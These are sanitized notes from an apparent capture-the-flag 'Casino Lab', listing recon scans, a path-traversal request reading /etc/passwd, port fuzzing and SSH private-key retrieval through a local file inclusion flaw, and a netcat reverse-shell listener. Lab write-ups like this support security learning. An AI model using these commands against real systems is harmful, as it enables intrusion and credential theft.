# 🎯 Notes - Casino Lab (SANITIZED)

## Target (sanitized)
- **IP**: [REDACTED]
- **System**: Linux (Debian)
- **Services**: SSH (22), HTTP (80), Internal service (example port)

## Commands & Observations (examples)
### Recon
- `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -k -t 50`
- `nmap -p- TARGET`
- `nmap --script vuln TARGET`

### LFI discovery
- Example parameter:
  - `/casino/explainmepls.php?learnabout=...`
- Example test:
  - `curl -v "http://TARGET/casino/explainmepls.php?learnabout=../../../../etc/passwd"`

### Port fuzzing via LFI (concept)
- `ffuf -u "http://TARGET/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ" -w portlist.txt`

### SSH key extraction (concept)
- `curl "http://TARGET/casino/explainmepls.php?learnabout=localhost:6969/path/to/key" -o shimmer_rsa`
- **Note:** Private keys and credentials are redacted from this repo.

### Post-Exploitation notes
- Reverse shells with `nc -lvnp 4444` (lab only)
- Inspect processes and files carefully; look for interesting binaries and file descriptors

## Findings (sanitized)
- LFI vulnerability allowing local resource access
- Internal service discovered via LFI fuzzing
- Credentials and keys exposed in lab environment (REDACTED)
- Vulnerable custom binary with hardcoded secrets (REDACTED)
- File-descriptor based information disclosure (demonstrated in lab)
